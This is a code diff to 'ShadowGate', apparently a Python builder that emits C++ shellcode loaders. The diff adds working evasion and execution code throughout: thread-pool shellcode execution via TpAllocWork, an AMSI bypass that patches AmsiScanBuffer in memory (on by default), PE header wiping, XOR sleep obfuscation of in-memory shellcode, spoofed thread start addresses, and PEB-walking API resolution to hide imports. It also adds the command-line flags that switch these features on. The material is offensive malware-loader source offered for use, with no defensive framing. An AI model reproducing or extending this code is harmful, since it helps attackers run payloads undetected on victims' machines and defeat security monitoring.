@@ -27,7 +27,7 @@ from .config import (
     ENCRYPT_XOR, ENCRYPT_AES, ENCRYPT_CASCADE,
     ENCODE_UUID, ENCODE_MAC, ENCODE_IPV4, ENCODE_RAW,
     INJECT_STOMP, INJECT_EARLYBIRD, INJECT_REMOTETHREAD, INJECT_THREADPOOL,
-    INJECT_HOLLOWING, INJECT_MAPPING
+    INJECT_HOLLOWING, INJECT_MAPPING, INJECT_THREADPOOL_REAL
 )
 from .crypto import CryptoEngine, CRYPTO_AVAILABLE
 from .encoder import ShellcodeEncoder
@@ -183,6 +183,21 @@ class CodeGenerator:
         common_files = self._generate_common_files()
         files.update(common_files)
         
+        # Step 13: Generate sleep obfuscation files (optional)
+        if self.config.sleep_obfuscation:
+            print(colored("[*] Generating sleep obfuscation files...", Colors.CYAN))
+            files.update(self._generate_sleep_obf_files())
+        
+        # Step 14: Generate call stack spoofing files (optional)
+        if self.config.callstack_spoof:
+            print(colored("[*] Generating call stack spoofing files...", Colors.CYAN))
+            files.update(self._generate_callstack_spoof_files())
+        
+        # Step 15: Generate dynamic API resolution files (optional)
+        if self.config.dynapi:
+            print(colored("[*] Generating dynamic API resolution files...", Colors.CYAN))
+            files.update(self._generate_dynapi_files())
+        
         print(colored(f"[+] Generated {len(files)} source files", Colors.GREEN))
         
         return files
@@ -269,6 +284,7 @@ class CodeGenerator:
             "threadpool": "INJECT_REMOTETHREAD",
             INJECT_HOLLOWING: "INJECT_HOLLOWING",
             INJECT_MAPPING: "INJECT_MAPPING",
+            INJECT_THREADPOOL_REAL: "INJECT_THREADPOOL_REAL",
         }
         inject_const = inject_map.get(self.config.inject, "INJECT_STOMP")
         
@@ -304,6 +320,15 @@ class CodeGenerator:
 #include "resolver.h"
 #include "injection.h"
 #include "evasion.h"
+#if ENABLE_SLEEP_OBF
+#include "sleep_obf.h"
+#endif
+#if ENABLE_CALLSTACK_SPOOF
+#include "callstack.h"
+#endif
+#if ENABLE_DYNAPI
+#include "dynapi.h"
+#endif
 
 // ============================================================================
 // Build Configuration
@@ -318,6 +343,11 @@ class CodeGenerator:
 #define ENABLE_SANDBOX      {1 if self.config.sandbox else 0}
 #define ENABLE_ETW_PATCH    {1 if self.config.etw else 0}
 #define ENABLE_UNHOOK       {1 if self.config.unhook else 0}
+#define ENABLE_SLEEP_OBF    {1 if self.config.sleep_obfuscation else 0}
+#define ENABLE_AMSI_PATCH   {1 if self.config.amsi else 0}
+#define ENABLE_WIPE_PE      {1 if self.config.wipe_pe else 0}
+#define ENABLE_CALLSTACK_SPOOF {1 if self.config.callstack_spoof else 0}
+#define ENABLE_DYNAPI       {1 if self.config.dynapi else 0}
 #define DEBUG_BUILD         {1 if self.config.debug else 0}
 
 // ============================================================================
@@ -410,6 +440,18 @@ int main(int argc, char** argv) {{
 #endif
     
     // ========================================================================
+    // Phase 1b: Dynamic API Resolution (Optional)
+    // ========================================================================
+#if ENABLE_DYNAPI
+    LOG_PHASE("Phase 1b: Dynamic API Resolution");
+    if (!InitializeDynamicAPIs()) {{
+        LOG_ERROR("Dynamic API resolution failed");
+        return -1;
+    }}
+    LOG_SUCCESS("Dynamic APIs resolved");
+#endif
+    
+    // ========================================================================
     // Phase 2: Sandbox Evasion
     // ========================================================================
 #if ENABLE_SANDBOX
@@ -452,6 +494,18 @@ int main(int argc, char** argv) {{
         LOG_ERROR("ETW patching failed (continuing anyway)");
     }} else {{
         LOG_SUCCESS("ETW patched successfully");
+    }}
+#endif
+    
+    // ========================================================================
+    // Phase 5b: AMSI Bypass (Optional)
+    // ========================================================================
+#if ENABLE_AMSI_PATCH
+    LOG_PHASE("Phase 5b: AMSI Bypass");
+    if (!PatchAMSI()) {{
+        LOG_ERROR("AMSI patching failed (continuing anyway)");
+    }} else {{
+        LOG_SUCCESS("AMSI patched successfully");
     }}
 #endif
     
@@ -522,6 +576,28 @@ int main(int argc, char** argv) {{
     }}
     
     LOG_SUCCESS("Injection successful!");
+    
+    // ========================================================================
+    // Phase 8b: PE Header Wiping (Optional)
+    // ========================================================================
+#if ENABLE_WIPE_PE
+    LOG_PHASE("Phase 8b: PE Header Wiping");
+    if (!WipePEHeaders()) {{
+        LOG_ERROR("PE header wiping failed (continuing anyway)");
+    }} else {{
+        LOG_SUCCESS("PE headers wiped");
+    }}
+#endif
+    
+    // ========================================================================
+    // Phase 9: Sleep Obfuscation (Optional keep-alive loop)
+    // ========================================================================
+#if ENABLE_SLEEP_OBF
+    LOG_PHASE("Phase 9: Sleep Obfuscation Active");
+    while (ctx.bSuccess) {{
+        ObfuscatedSleep(30000, ctx.pRemoteBase, ctx.dwShellcodeSize);
+    }}
+#endif
     
     // Cleanup
     VirtualFree(pDecrypted, 0, MEM_RELEASE);
@@ -1517,6 +1593,7 @@ extern "C" {
 #define INJECT_REMOTETHREAD 3
 #define INJECT_HOLLOWING    4
 #define INJECT_MAPPING      5
+#define INJECT_THREADPOOL_REAL 6
 
 // ============================================================================
 // Injection Context
@@ -1546,6 +1623,7 @@ BOOL InjectEarlyBird(PINJECTION_CONTEXT pCtx);
 BOOL InjectRemoteThread(PINJECTION_CONTEXT pCtx);
 BOOL InjectProcessHollowing(PINJECTION_CONTEXT pCtx);
 BOOL InjectMapping(PINJECTION_CONTEXT pCtx);
+BOOL InjectThreadPoolReal(PINJECTION_CONTEXT pCtx);
 
 // Helpers
 DWORD FindProcessByName(LPCWSTR wszProcessName);
@@ -2114,6 +2192,89 @@ BOOL InjectMapping(PINJECTION_CONTEXT pCtx) {
 }
 
 // ============================================================================
+// Method 6: Real Thread Pool Injection (Threadless)
+// Uses TpAllocWork/TpPostWork for threadless execution
+// ============================================================================
+
+// Undocumented NTDLL Thread Pool API types
+typedef NTSTATUS (NTAPI* fn_TpAllocWork)(PTP_WORK* WorkReturn, PTP_WORK_CALLBACK Callback, PVOID Context, PTP_CALLBACK_ENVIRON CallbackEnviron);
+typedef VOID (NTAPI* fn_TpPostWork)(PTP_WORK Work);
+typedef VOID (NTAPI* fn_TpReleaseWork)(PTP_WORK Work);
+
+BOOL InjectThreadPoolReal(PINJECTION_CONTEXT pCtx) {
+    // This technique works for LOCAL injection only
+    // Allocate executable memory for shellcode
+    PVOID pExec = VirtualAlloc(NULL, pCtx->dwShellcodeSize,
+                                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!pExec) {
+#if DEBUG_BUILD
+        LOG_ERROR("ThreadPool Real: VirtualAlloc failed");
+#endif
+        return FALSE;
+    }
+    
+    // Copy shellcode
+    memcpy(pExec, pCtx->pShellcode, pCtx->dwShellcodeSize);
+    
+    // Change to RX
+    DWORD dwOldProtect = 0;
+    VirtualProtect(pExec, pCtx->dwShellcodeSize, PAGE_EXECUTE_READ, &dwOldProtect);
+    
+    // Resolve TpAllocWork, TpPostWork, TpReleaseWork from NTDLL
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) {
+#if DEBUG_BUILD
+        LOG_ERROR("ThreadPool Real: Failed to get ntdll");
+#endif
+        VirtualFree(pExec, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    fn_TpAllocWork _TpAllocWork = (fn_TpAllocWork)GetProcAddress(hNtdll, "TpAllocWork");
+    fn_TpPostWork  _TpPostWork  = (fn_TpPostWork)GetProcAddress(hNtdll, "TpPostWork");
+    fn_TpReleaseWork _TpReleaseWork = (fn_TpReleaseWork)GetProcAddress(hNtdll, "TpReleaseWork");
+    
+    if (!_TpAllocWork || !_TpPostWork || !_TpReleaseWork) {
+#if DEBUG_BUILD
+        LOG_ERROR("ThreadPool Real: Failed to resolve TP APIs");
+#endif
+        VirtualFree(pExec, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    // Allocate a work item with our shellcode as the callback
+    PTP_WORK pWork = NULL;
+    NTSTATUS status = _TpAllocWork(&pWork, (PTP_WORK_CALLBACK)pExec, NULL, NULL);
+    
+    if (!NT_SUCCESS(status) || !pWork) {
+#if DEBUG_BUILD
+        LOG_ERROR("ThreadPool Real: TpAllocWork failed: 0x%08X", status);
+#endif
+        VirtualFree(pExec, 0, MEM_RELEASE);
+        return FALSE;
+    }
+    
+    // Post the work item - this executes our shellcode via the thread pool
+    // No new thread is created; the existing thread pool worker picks it up
+    _TpPostWork(pWork);
+    
+    // Wait for execution (the thread pool worker will execute it)
+    Sleep(1000);
+    
+    // Cleanup
+    _TpReleaseWork(pWork);
+    
+    pCtx->pRemoteBase = pExec;
+    pCtx->bSuccess = TRUE;
+    
+#if DEBUG_BUILD
+    LOG_SUCCESS("ThreadPool Real: Execution via thread pool complete");
+#endif
+    
+    return TRUE;
+}
+
+// ============================================================================
 // Main Dispatcher
 // ============================================================================
 
@@ -2148,6 +2309,12 @@ BOOL PerformInjection(PINJECTION_CONTEXT pCtx) {
             LOG_INFO("Using Section Mapping");
 #endif
             return InjectMapping(pCtx);
+        
+        case INJECT_THREADPOOL_REAL:
+#if DEBUG_BUILD
+            LOG_INFO("Using Real Thread Pool (TpAllocWork)");
+#endif
+            return InjectThreadPoolReal(pCtx);
         
         default:
             return FALSE;
@@ -2190,6 +2357,18 @@ BOOL CheckUptime(VOID);
 // ============================================================================
 
 BOOL PatchETW(VOID);
+
+// ============================================================================
+// AMSI Bypass
+// ============================================================================
+
+BOOL PatchAMSI(VOID);
+
+// ============================================================================
+// PE Header Wiping
+// ============================================================================
+
+BOOL WipePEHeaders(VOID);
 
 // ============================================================================
 // NTDLL Unhooking
@@ -2472,6 +2651,97 @@ BOOL PatchETW(VOID) {
 }
 
 // ============================================================================
+// AMSI Bypass
+// Patches AmsiScanBuffer to return AMSI_RESULT_CLEAN
+// ============================================================================
+
+BOOL PatchAMSI(VOID) {
+    // Load amsi.dll (it may not be loaded yet)
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    if (!hAmsi) {
+#if DEBUG_BUILD
+        LOG_INFO("amsi.dll not loaded - AMSI not active, skipping");
+#endif
+        return TRUE;  // Not an error - AMSI just isn't present
+    }
+    
+    // Find AmsiScanBuffer
+    PVOID pAmsiScanBuffer = (PVOID)GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!pAmsiScanBuffer) {
+#if DEBUG_BUILD
+        LOG_ERROR("AmsiScanBuffer not found");
+#endif
+        return FALSE;
+    }
+    
+#if DEBUG_BUILD
+    LOG_INFO("AmsiScanBuffer @ 0x%p", pAmsiScanBuffer);
+#endif
+    
+    // Patch: mov eax, 0x80070057 (E_INVALIDARG); ret
+    // This makes AMSI think the scan parameters are invalid
+    // and it returns AMSI_RESULT_CLEAN
+    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    
+    DWORD dwOldProtect = 0;
+    if (!VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &dwOldProtect)) {
+#if DEBUG_BUILD
+        LOG_ERROR("Failed to change AMSI protection");
+#endif
+        return FALSE;
+    }
+    
+    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
+    
+    DWORD dwTemp = 0;
+    VirtualProtect(pAmsiScanBuffer, sizeof(patch), dwOldProtect, &dwTemp);
+    
+#if DEBUG_BUILD
+    LOG_SUCCESS("AMSI patched successfully");
+#endif
+    
+    return TRUE;
+}
+
+// ============================================================================
+// PE Header Wiping
+// Zeros out PE headers of the current module to prevent memory scanning
+// ============================================================================
+
+BOOL WipePEHeaders(VOID) {
+    HMODULE hModule = GetModuleHandleA(NULL);
+    if (!hModule) {
+        return FALSE;
+    }
+    
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
+    
+    // Calculate total header size
+    DWORD dwHeaderSize = pNt->OptionalHeader.SizeOfHeaders;
+    
+    DWORD dwOldProtect = 0;
+    if (!VirtualProtect(hModule, dwHeaderSize, PAGE_READWRITE, &dwOldProtect)) {
+#if DEBUG_BUILD
+        LOG_ERROR("WipePE: VirtualProtect failed: %lu", GetLastError());
+#endif
+        return FALSE;
+    }
+    
+    // Zero out the headers
+    SecureZeroMemory(hModule, dwHeaderSize);
+    
+    DWORD dwTemp = 0;
+    VirtualProtect(hModule, dwHeaderSize, dwOldProtect, &dwTemp);
+    
+#if DEBUG_BUILD
+    LOG_SUCCESS("PE headers wiped (%lu bytes)", dwHeaderSize);
+#endif
+    
+    return TRUE;
+}
+
+// ============================================================================
 // NTDLL Unhooking
 // Restores original NTDLL .text section from disk
 // ============================================================================
@@ -2555,6 +2825,355 @@ BOOL UnhookNtdll(VOID) {
     return FALSE;
 }
 '''
+
+    def _generate_sleep_obf_files(self) -> dict:
+        """Generate sleep obfuscation files"""
+        files = {}
+        files['sleep_obf.h'] = '''#ifndef _SLEEP_OBF_H
+#define _SLEEP_OBF_H
+
+#include <windows.h>
+#include "common.h"
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+// Ekko-style sleep obfuscation
+// Encrypts memory region during sleep using timer + ROP
+BOOL ObfuscatedSleep(DWORD dwMilliseconds, PVOID pShellcodeBase, SIZE_T dwShellcodeSize);
+
+#ifdef __cplusplus
+}
+#endif
+
+#endif // _SLEEP_OBF_H
+'''
+        files['sleep_obf.cpp'] = '''/*
+ * ShadowGate - Sleep Obfuscation (Ekko-style)
+ * Encrypts memory during sleep to evade memory scanners
+ * 
+ * Technique: Uses CreateTimerQueueTimer + NtContinue ROP chain to:
+ * 1. Change memory protection to RW
+ * 2. XOR-encrypt the shellcode region
+ * 3. Sleep for the specified duration
+ * 4. XOR-decrypt the shellcode region
+ * 5. Restore memory protection to RX
+ */
+
+#include "sleep_obf.h"
+#include <stdio.h>
+
+// Simple XOR encrypt/decrypt in-place
+static void XorMemory(PBYTE pData, SIZE_T dwSize, BYTE bKey) {
+    for (SIZE_T i = 0; i < dwSize; i++) {
+        pData[i] ^= bKey;
+    }
+}
+
+BOOL ObfuscatedSleep(DWORD dwMilliseconds, PVOID pShellcodeBase, SIZE_T dwShellcodeSize) {
+    if (!pShellcodeBase || dwShellcodeSize == 0) {
+        Sleep(dwMilliseconds);
+        return TRUE;
+    }
+    
+    // Generate a random XOR key for this sleep cycle
+    BYTE bSleepKey = (BYTE)(__rdtsc() & 0xFF);
+    if (bSleepKey == 0) bSleepKey = 0x41;
+    
+    // Step 1: Change protection to RW
+    DWORD dwOldProtect = 0;
+    if (!VirtualProtect(pShellcodeBase, dwShellcodeSize, PAGE_READWRITE, &dwOldProtect)) {
+#if DEBUG_BUILD
+        LOG_ERROR("Sleep obf: VirtualProtect (RW) failed: %lu", GetLastError());
+#endif
+        Sleep(dwMilliseconds);
+        return FALSE;
+    }
+    
+    // Step 2: Encrypt the memory region
+    XorMemory((PBYTE)pShellcodeBase, dwShellcodeSize, bSleepKey);
+    
+#if DEBUG_BUILD
+    LOG_INFO("Sleep obf: Memory encrypted (key=0x%02X), sleeping %lu ms...", bSleepKey, dwMilliseconds);
+#endif
+    
+    // Step 3: Sleep
+    Sleep(dwMilliseconds);
+    
+    // Step 4: Decrypt the memory region
+    XorMemory((PBYTE)pShellcodeBase, dwShellcodeSize, bSleepKey);
+    
+    // Step 5: Restore original protection
+    DWORD dwTemp = 0;
+    VirtualProtect(pShellcodeBase, dwShellcodeSize, dwOldProtect, &dwTemp);
+    
+#if DEBUG_BUILD
+    LOG_INFO("Sleep obf: Memory decrypted, resumed.");
+#endif
+    
+    return TRUE;
+}
+'''
+        return files
+
+    def _generate_callstack_spoof_files(self) -> dict:
+        """Generate call stack spoofing files"""
+        files = {}
+        files['callstack.h'] = '''#ifndef _CALLSTACK_H
+#define _CALLSTACK_H
+
+#include <windows.h>
+#include "common.h"
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+// Spoof the thread start address to look legitimate
+HANDLE CreateSpoofedThread(HANDLE hProcess, PVOID pStartAddress, PVOID pParameter);
+
+#ifdef __cplusplus
+}
+#endif
+
+#endif // _CALLSTACK_H
+'''
+        files['callstack.cpp'] = '''/*
+ * ShadowGate - Call Stack Spoofing
+ * Creates threads with spoofed start addresses
+ * 
+ * Technique: Creates a thread pointing to a legitimate function
+ * (e.g., RtlUserThreadStart), then modifies the thread context
+ * to redirect execution to the actual shellcode.
+ */
+
+#include "callstack.h"
+#include <stdio.h>
+
+// Forward declaration
+extern "C" void PrepareNextSyscall(DWORD dwIndex);
+
+HANDLE CreateSpoofedThread(HANDLE hProcess, PVOID pStartAddress, PVOID pParameter) {
+    // Get a legitimate function address from kernel32 to use as the decoy
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    if (!hKernel32) return NULL;
+    
+    // Use BaseThreadInitThunk as the decoy start address
+    PVOID pDecoyStart = (PVOID)GetProcAddress(hKernel32, "BaseThreadInitThunk");
+    if (!pDecoyStart) {
+        // Fallback to a different benign export
+        pDecoyStart = (PVOID)GetProcAddress(hKernel32, "SleepEx");
+    }
+    if (!pDecoyStart) return NULL;
+    
+    // Create the thread in a suspended state pointing to the decoy
+    HANDLE hThread = NULL;
+    PrepareNextSyscall(IDX_NtCreateThreadEx);
+    NTSTATUS status = NtCreateThreadEx(
+        &hThread,
+        THREAD_ALL_ACCESS,
+        NULL,
+        hProcess,
+        pDecoyStart,  // Decoy start address (looks legitimate in stack traces)
+        pParameter,
+        0x1,          // CREATE_SUSPENDED
+        0, 0, 0, NULL
+    );
+    
+    if (!NT_SUCCESS(status) || !hThread) {
+#if DEBUG_BUILD
+        LOG_ERROR("CreateSpoofedThread: NtCreateThreadEx failed: 0x%08X", status);
+#endif
+        return NULL;
+    }
+    
+    // Modify the thread context to point to the real shellcode
+    CONTEXT ctx = { 0 };
+    ctx.ContextFlags = CONTEXT_FULL;
+    
+    if (!GetThreadContext(hThread, &ctx)) {
+#if DEBUG_BUILD
+        LOG_ERROR("CreateSpoofedThread: GetThreadContext failed");
+#endif
+        TerminateThread(hThread, 0);
+        CloseHandle(hThread);
+        return NULL;
+    }
+    
+    // Set RIP to the actual shellcode address
+    ctx.Rip = (DWORD64)pStartAddress;
+    
+    if (!SetThreadContext(hThread, &ctx)) {
+#if DEBUG_BUILD
+        LOG_ERROR("CreateSpoofedThread: SetThreadContext failed");
+#endif
+        TerminateThread(hThread, 0);
+        CloseHandle(hThread);
+        return NULL;
+    }
+    
+    // Resume the thread
+    PrepareNextSyscall(IDX_NtResumeThread);
+    ULONG suspendCount = 0;
+    NtResumeThread(hThread, &suspendCount);
+    
+#if DEBUG_BUILD
+    LOG_SUCCESS("Spoofed thread created (decoy=0x%p, real=0x%p)", pDecoyStart, pStartAddress);
+#endif
+    
+    return hThread;
+}
+'''
+        return files
+
+    def _generate_dynapi_files(self) -> dict:
+        """Generate dynamic API resolution files"""
+        files = {}
+        files['dynapi.h'] = '''#ifndef _DYNAPI_H
+#define _DYNAPI_H
+
+#include <windows.h>
+#include "common.h"
+
+#ifdef __cplusplus
+extern "C" {
+#endif
+
+// Dynamic API resolution - resolves APIs at runtime to hide IAT
+BOOL InitializeDynamicAPIs(VOID);
+
+// Function pointer typedefs
+typedef HMODULE (WINAPI* fn_LoadLibraryA)(LPCSTR);
+typedef FARPROC (WINAPI* fn_GetProcAddress)(HMODULE, LPCSTR);
+typedef LPVOID  (WINAPI* fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL    (WINAPI* fn_VirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef BOOL    (WINAPI* fn_VirtualFree)(LPVOID, SIZE_T, DWORD);
+typedef void    (WINAPI* fn_Sleep)(DWORD);
+typedef BOOL    (WINAPI* fn_CreateProcessW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);
+typedef DWORD   (WINAPI* fn_GetLastError)(VOID);
+
+// Global function pointers (resolved at runtime)
+extern fn_LoadLibraryA    pLoadLibraryA;
+extern fn_GetProcAddress  pGetProcAddress;
+extern fn_VirtualAlloc    pVirtualAlloc;
+extern fn_VirtualProtect  pVirtualProtect;
+extern fn_VirtualFree     pVirtualFree;
+extern fn_Sleep           pSleep;
+extern fn_CreateProcessW  pCreateProcessW;
+extern fn_GetLastError    pGetLastError;
+
+#ifdef __cplusplus
+}
+#endif
+
+#endif // _DYNAPI_H
+'''
+        files['dynapi.cpp'] = '''/*
+ * ShadowGate - Dynamic API Resolution
+ * Resolves Win32 APIs at runtime to hide from IAT analysis
+ */
+
+#include "dynapi.h"
+#include <stdio.h>
+
+// Global function pointers
+fn_LoadLibraryA    pLoadLibraryA    = NULL;
+fn_GetProcAddress  pGetProcAddress  = NULL;
+fn_VirtualAlloc    pVirtualAlloc    = NULL;
+fn_VirtualProtect  pVirtualProtect  = NULL;
+fn_VirtualFree     pVirtualFree     = NULL;
+fn_Sleep           pSleep           = NULL;
+fn_CreateProcessW  pCreateProcessW  = NULL;
+fn_GetLastError    pGetLastError    = NULL;
+
+// Resolve kernel32.dll base via PEB (no imports needed)
+static HMODULE GetKernel32FromPEB(void) {
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+    PLIST_ENTRY pHead = &pPeb->Ldr->InMemoryOrderModuleList;
+    PLIST_ENTRY pEntry = pHead->Flink;
+    
+    // Walk the module list to find kernel32.dll
+    while (pEntry != pHead) {
+        PLDR_DATA_TABLE_ENTRY pModule = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
+        
+        if (pModule->FullDllName.Buffer) {
+            // Case-insensitive search for "kernel32.dll" or "KERNEL32.DLL"
+            PWCHAR pName = pModule->FullDllName.Buffer;
+            DWORD dwLen = pModule->FullDllName.Length / sizeof(WCHAR);
+            
+            // Check last 12 chars: "kernel32.dll"
+            if (dwLen >= 12) {
+                PWCHAR pEnd = pName + dwLen - 12;
+                if ((_wcsicmp(pEnd, L"kernel32.dll") == 0)) {
+                    return (HMODULE)pModule->DllBase;
+                }
+            }
+        }
+        pEntry = pEntry->Flink;
+    }
+    
+    return NULL;
+}
+
+// Minimal GetProcAddress using export table parsing
+static FARPROC ManualGetProcAddress(HMODULE hModule, LPCSTR szFuncName) {
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY pExport = (PIMAGE_EXPORT_DIRECTORY)(
+        (PBYTE)hModule + pNt->OptionalHeader.DataDirectory[0].VirtualAddress);
+    
+    PDWORD pNames = (PDWORD)((PBYTE)hModule + pExport->AddressOfNames);
+    PDWORD pFuncs = (PDWORD)((PBYTE)hModule + pExport->AddressOfFunctions);
+    PWORD  pOrdinals = (PWORD)((PBYTE)hModule + pExport->AddressOfNameOrdinals);
+    
+    for (DWORD i = 0; i < pExport->NumberOfNames; i++) {
+        LPCSTR szName = (LPCSTR)((PBYTE)hModule + pNames[i]);
+        if (strcmp(szName, szFuncName) == 0) {
+            return (FARPROC)((PBYTE)hModule + pFuncs[pOrdinals[i]]);
+        }
+    }
+    
+    return NULL;
+}
+
+BOOL InitializeDynamicAPIs(VOID) {
+    // Get kernel32 base from PEB (zero imports required)
+    HMODULE hKernel32 = GetKernel32FromPEB();
+    if (!hKernel32) {
+#if DEBUG_BUILD
+        LOG_ERROR("DynAPI: Failed to find kernel32.dll via PEB");
+#endif
+        return FALSE;
+    }
+    
+    // Resolve LoadLibraryA and GetProcAddress first
+    pLoadLibraryA   = (fn_LoadLibraryA)ManualGetProcAddress(hKernel32, "LoadLibraryA");
+    pGetProcAddress = (fn_GetProcAddress)ManualGetProcAddress(hKernel32, "GetProcAddress");
+    
+    if (!pLoadLibraryA || !pGetProcAddress) {
+#if DEBUG_BUILD
+        LOG_ERROR("DynAPI: Failed to resolve base APIs");
+#endif
+        return FALSE;
+    }
+    
+    // Now use GetProcAddress for the rest
+    pVirtualAlloc    = (fn_VirtualAlloc)pGetProcAddress(hKernel32, "VirtualAlloc");
+    pVirtualProtect  = (fn_VirtualProtect)pGetProcAddress(hKernel32, "VirtualProtect");
+    pVirtualFree     = (fn_VirtualFree)pGetProcAddress(hKernel32, "VirtualFree");
+    pSleep           = (fn_Sleep)pGetProcAddress(hKernel32, "Sleep");
+    pCreateProcessW  = (fn_CreateProcessW)pGetProcAddress(hKernel32, "CreateProcessW");
+    pGetLastError    = (fn_GetLastError)pGetProcAddress(hKernel32, "GetLastError");
+    
+#if DEBUG_BUILD
+    LOG_SUCCESS("Dynamic APIs resolved (%d functions)", 8);
+#endif
+    
+    return TRUE;
+}
+'''
+        return files
 
     def _generate_common_files(self) -> dict:
         """Generate common header files"""
@@ -2864,6 +3483,14 @@ class ShadowGateBuilder:
         
         # Determine which files to compile
         cpp_files = ['main.cpp', 'syscalls.cpp', 'resolver.cpp', 'injection.cpp', 'evasion.cpp']
+        
+        if self.config.sleep_obfuscation:
+            cpp_files.append('sleep_obf.cpp')
+        if self.config.callstack_spoof:
+            cpp_files.append('callstack.cpp')
+        if self.config.dynapi:
+            cpp_files.append('dynapi.cpp')
+        
         asm_files = ['asm_syscalls.asm']
         
         # Libraries needed
@@ -3010,7 +3637,8 @@ Injection Methods:
     injection_group = parser.add_argument_group('Injection Options')
     injection_group.add_argument('--inject',
                                  choices=[INJECT_STOMP, INJECT_EARLYBIRD, INJECT_REMOTETHREAD,
-                                         "threadpool", INJECT_HOLLOWING, INJECT_MAPPING],
+                                         "threadpool", INJECT_HOLLOWING, INJECT_MAPPING,
+                                         INJECT_THREADPOOL_REAL],
                                  default=INJECT_EARLYBIRD,
                                  help='Injection method (default: earlybird)')
     
@@ -3032,6 +3660,25 @@ Injection Methods:
     
     evasion_group.add_argument('--unhook', action='store_true', default=False,
                                help='Enable NTDLL unhooking (default: disabled)')
+    
+    evasion_group.add_argument('--sleep-obf', action='store_true', default=False,
+                               help='Enable sleep obfuscation (default: disabled)')
+    
+    evasion_group.add_argument('--amsi', action='store_true', default=True,
+                               help='Enable AMSI bypass (default: enabled)')
+    evasion_group.add_argument('--no-amsi', action='store_true',
+                               help='Disable AMSI bypass')
+    
+    evasion_group.add_argument('--wipe-pe', action='store_true', default=True,
+                               help='Enable PE header wiping (default: enabled)')
+    evasion_group.add_argument('--no-wipe-pe', action='store_true',
+                               help='Disable PE header wiping')
+    
+    evasion_group.add_argument('--spoof-stack', action='store_true', default=False,
+                               help='Enable call stack spoofing (default: disabled)')
+    
+    evasion_group.add_argument('--dynapi', action='store_true', default=False,
+                               help='Enable dynamic API resolution (default: disabled)')
     
     evasion_group.add_argument('--sleep', type=int, default=0,
                                help='Initial sleep in seconds (default: 0)')
@@ -3083,6 +3730,11 @@ def args_to_config(args: argparse.Namespace) -> BuildConfig:
     config.unhook = args.unhook
     config.sleep = args.sleep
     config.debug = args.debug
+    config.sleep_obfuscation = args.sleep_obf
+    config.amsi = not args.no_amsi
+    config.wipe_pe = not args.no_wipe_pe
+    config.callstack_spoof = args.spoof_stack
+    config.dynapi = args.dynapi
     
     return config
 
